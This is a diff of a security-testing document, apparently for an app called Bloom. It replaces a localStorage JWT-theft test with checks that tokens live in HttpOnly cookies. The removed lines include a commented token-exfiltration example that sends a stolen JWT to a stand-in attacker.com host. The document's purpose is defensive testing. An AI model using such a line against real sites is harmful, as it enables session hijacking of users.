@@ -73,36 +73,48 @@ docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-baseline.py \
 #### Test JWT Storage Vulnerability (Pre-Fix)
 
 ```javascript
-// Test script: jwt-storage-test.js
-// Simulate XSS attack to steal JWT tokens
+// Test script: jwt-cookie-security-test.js
+// Verify HttpOnly cookie implementation is secure
 
-// 1. Login and obtain JWT
+// 1. Login (tokens set in HttpOnly cookies automatically)
 const loginResponse = await fetch("/api/v1/auth/login", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
+    credentials: "include", // Important: include cookies
     body: JSON.stringify({ email: "test@bloom.com", password: "password123" }),
 });
 
-// 2. Check if token accessible via localStorage
+// 2. Verify tokens are NOT accessible via JavaScript
 const storedToken = localStorage.getItem("access_token");
-console.log("Token accessible via localStorage:", !!storedToken);
+console.log("Token in localStorage:", !!storedToken); // Should be false
 
-// 3. Simulate XSS token theft
-if (storedToken) {
-    console.log("🚨 VULNERABILITY: Token can be stolen via XSS");
-    // In real attack: fetch('https://attacker.com/steal?token=' + storedToken)
+// 3. Verify cookies are HttpOnly (not accessible via JS)
+const cookieToken = document.cookie.includes("access_token");
+console.log("Cookie accessible via JS:", cookieToken); // Should be false (HttpOnly)
+
+// 4. Test that authenticated requests work (cookies sent automatically)
+const meResponse = await fetch("/api/v1/auth/me", {
+    credentials: "include",
+});
+console.log("Auth with cookies:", meResponse.ok); // Should be true
+
+if (!storedToken && !cookieToken && meResponse.ok) {
+    console.log("✅ SECURE: Tokens in HttpOnly cookies, XSS protected");
+} else {
+    console.log("🚨 ISSUE: Token storage needs investigation");
 }
 ```
 
-#### Test httpOnly Cookie Implementation (Post-Fix)
+#### Verify HttpOnly Cookie Configuration
 
 ```javascript
-// Test that tokens are not accessible via JavaScript after fix
+// Test that tokens are not accessible via JavaScript
 const tokenFromStorage = localStorage.getItem("access_token");
 const tokenFromCookie = document.cookie.includes("access_token");
 
 console.log("Token in localStorage:", !!tokenFromStorage); // Should be false
-console.log("Cookie present (not accessible):", tokenFromCookie); // Should be true but not readable
+console.log("Token readable from cookie:", tokenFromCookie); // Should be false (HttpOnly)
+// Cookies are present but not JS-accessible - verified by successful API calls
 ```
 
 ### Secret Key Validation Testing
